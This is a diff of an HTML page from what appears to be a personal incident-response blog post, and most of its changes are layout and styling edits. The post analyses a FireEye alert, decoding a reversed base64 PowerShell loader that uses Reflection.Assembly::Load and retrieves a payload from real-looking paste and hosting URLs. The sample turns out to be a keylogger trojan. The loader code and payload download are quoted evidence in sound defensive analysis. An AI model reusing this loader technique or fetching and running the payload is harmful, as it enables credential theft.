@@ -46,20 +46,20 @@
             </div>
         <footer class="d-none d-xl-block">
             <div class="container">
-              <p class="m-0 text-center footerpage">Copyright &copy; 2020 Olivier Leung<br>All rights reserved.</p>
+              <p class="m-1 text-center footerpage">Copyright &copy; 2020 Olivier Leung<br>All rights reserved.</p>
             </div>
         </footer>
         </nav>
         <!-- Page Content-->
         <div>
-            <nav class="navbar navbar-expand-xl navbar-dark bg-secondary sticky-top">
+            <nav class="navbar navbar-expand-xl navbar-dark bg-header sticky-top">
             <h3 class="header-article"><a href="../dfirpage.html">Digital Forensics and Incident Response </a>> Investigation - PowerShell .NET Assembly Usage detected</h3>
             </nav>
             
             <section class="article">
                 <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
                     <div class="flex-grow-1">
-                        <h3 class="mb-0">1/ DETECTION</h3>
+                        <h3 class="mb-0 header-article">1/ DETECTION</h3>
                         <p>
                             The detection comes from the EDR <strong>FireEye HX</strong>, and it alerts us that one system is having some .NET methods that might be used to download resources from a remote location or stored on disk or registry. <br>
                             <br>
@@ -68,7 +68,7 @@
                             Source: <strong>Mandiant</strong> <br>
                             <br>
 
-                            <i style="background-color: yellow">
+                            <i style="background-color: #020b5d">
                                 Alerted 21 minutes ago <br>
                                 processEvent/timestamp  2020-12-01 17:42:05Z <br>
                                 processEvent/startTime  2020-12-01 17:42:05Z <br>
@@ -92,8 +92,8 @@
              <section class="article">
                 <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
                     <div class="flex-grow-1">
-                        <h3 class="mb-0">2/ Investigation</h3>
-                            <br>
+                        <h3 class="mb-0 header-article">2/ Investigation</h3>
+                        <p>
                             The field "processCmdLine" gives a lot of information, but if we're neglecting it, we will probably not understand what the command line does. <br>
                             <br>
                             First, we have a variable « dll » storing the value <i>'0/8JMh1/r/ee.etsap//:sptth'</i>
@@ -115,28 +115,36 @@
                             Base64 will only be composed of characters 'A-Z', 'a-z', '0-9', '+', '/' and it is padded at the end with '=', to make the length a multiple of 4. <br>
                             Since we see that there are ‘==’ at the beginning of the string we can guess that the encoded data is also inversed. So before decoding it, we probably should reverse it. <br>
                             Therefore, we understand why the command line has $Rumpe = [System.Convert]::FromBase64String( $RumpeD[-1..-$RumpeD.Length] -join '') <br>
-                            To retrieve all the content of the webpage, we will use the <i>curl</i> command. Accessing to a webpage is the same as making a GET request. <br>
-                            <div class="squarebox">Curl –X GET https://paste.ee/r/1hMJ8/0 -o encodedString.txt</div>
-                            <img src="img/PS .NET Assembly Usage/curlget.png" class="img-fluid" width="700">
-                            Then on linux, the function <i>rev</i> allows us to reverse any string. <br>
-                            <div class="squarebox">cat encodedString.txt | rev > encodedStringREV.txt</div> <br>
-                            Once we have reversed the content of the file, we can decode any base64 with the command base64 and using the parameter –d. <br>
-                            <div class="squarebox">
-                                base64 –d encodedStringREV.txt > String.txt
-                            </div>
-                            
+                            To retrieve all the content of the webpage, we will use the <i>curl</i> command. Accessing to a webpage is the same as making a GET request. <br></p>
 
+                            <div class="squarebox">Curl –X GET https://paste.ee/r/1hMJ8/0 -o encodedString.txt</div>
+
+                            <p>
+                            <img src="img/PS .NET Assembly Usage/curlget.png" class="img-fluid" width="700">
+                            Then on linux, the function <i>rev</i> allows us to reverse any string. <br></p>
+
+                            <div class="squarebox">cat encodedString.txt | rev > encodedStringREV.txt</div> <br>
+
+                            <p>
+                            Once we have reversed the content of the file, we can decode any base64 with the command base64 and using the parameter –d. <br></p>
+
+                            <div class="squarebox"> base64 –d encodedStringREV.txt > String.txt </div>
+                            
+                            <p>
                             <img src="img/PS .NET Assembly Usage/string.png" class="img-fluid" width="700">
 
                             The decoded file is acutally a binary file. We can use <i>hexdump</i> to see if that is a PE file (Windows executable), the magic byte « 4d 5a » confirm that it is a PE file.
 
                             <img src="img/PS .NET Assembly Usage/hexdump.png" class="img-fluid" width="700">
+                            </p>
 
-                            <div class="longword" style="background-color: yellow">
+                            <div class="longword" style="background-color: #020b5d">
                                 [Byte[]] $Rumpe = [System.Convert]::FromBase64String( $RumpeD[-1..-$RumpeD.Length] -join '' );
                                 [Reflection.Assembly]::Load($Rumpe).GetType('ent.Class1').GetMethod('Run').Invoke($null, [object[]] ('txt.33615435222/sbv/erots.sbvle//:ptth'))"
-                            </div><br>
+                            </div>
 
+                            <p>
+                            <br>
                             The method « FromBase64String » on the variable RumpeD and store it on a new variable « Rumpe ». According to Microsoft docs, the method [Reflection.Assembly]::Load() is taking a Byte type in argument so that explains why the script cast the variable Rumpe in Byte[]. Then the function "<i>Invoke</i>" is called to remotely run a command. The argument of the function "<i>Invoke</i>" seems to be another reverse URL. It is probably used to bypass URL check.<br>
                             <br>
                             <u>In powershell like in php « $ » is to indicate a variable.</u>
@@ -159,16 +167,18 @@
                             Once decode, we found another PE file since we have MZ byte. <br>
                             Since this URL is the one that is going to run on a system, let's find out what it does. 
                             We will continue the investigation with some static analysis, let's analyze the strings of the binary. <strong>Radare2</strong> is a powerful tool to do some reverse engineering.
-                            Radare2 comes with a tool called rabin2 and it can extract the binary information by using the –I parameter, the string with –z parameter or use –zz if we don’t want to be limited on the string found on the data section. <br>
-                            <div class="squarebox">
-                                Rabin2 –zz string2.exe
-                            </div>
+                            Radare2 comes with a tool called rabin2 and it can extract the binary information by using the –I parameter, the string with –z parameter or use –zz if we don’t want to be limited on the string found on the data section. <br></p>
 
+                            <div class="squarebox">Rabin2 –zz string2.exe</div>
+
+                            <p>
                             <img src="img/PS .NET Assembly Usage/rabin2.png" class="img-fluid" width="500">
 
-                            Looking at the string, we see that this PE file contains an executable file called « dayandi.exe » and below we see the word Keylogger. <br>
-                            <br>
+                            Looking at the string, we see that this PE file contains an executable file called « dayandi.exe » and below we see the word Keylogger. <br> </p>
+                            
                             <div class="squarebox">rabin2 -I string2.exe</div>
+
+                            <p>
                             <img src="img/PS .NET Assembly Usage/rabin2info.png" class="img-fluid" width="500">
 
                             This is a .NET executable, since radare2 is not optimized for .NET file, let's switch to another tool called <strong>dnSpy</strong> which supports decompilation, simple deobfuscation, modification and debugging of .NET applications.
@@ -217,11 +227,13 @@
             <section class="article">
                 <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
                     <div class="flex-grow-1">
-                        <h3 class="mb-0">3/ Conclusion</h3>
+                        <h3 class="mb-0 header-article">3/ Conclusion</h3>
+                        <p>               
                         FireEye has detected a suspicious bahavior, but doesn't really know what was exactly the program installed by the user. After, reversing the program, we've found it will proceed to a connection to a domain on a specific port. It also records all the user's inputs and send it to the domain. Therefore, it is a trojan keylogger which register every keyboard input and send it to the domain. 
 
                         After that analysis, we know the intention of the attacker, retrieving the users' credentials and get an access to the company network. <br>
                         Blocking the domain name, file hash is a good start for future protection. A rebuild of the system, and expiring the user's password is necessary. 
+                        </p>
                     </div>
                 </div>
             </section>
